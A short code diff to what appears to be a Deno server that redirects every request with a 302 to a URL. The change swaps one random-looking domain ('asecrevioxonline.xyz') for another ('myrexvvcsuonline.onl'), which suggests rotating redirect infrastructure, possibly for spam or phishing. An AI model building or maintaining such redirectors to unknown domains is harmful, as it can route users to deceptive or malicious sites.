@@ -5,7 +5,7 @@ serve((_req) => {
   return new Response(null, {
     status: 302,
     headers: {
-      Location: "https://asecrevioxonline.xyz/bh/herbert/",
+      Location: "https://myrexvvcsuonline.onl/burkhe/herbert/",
     },
   });
 });
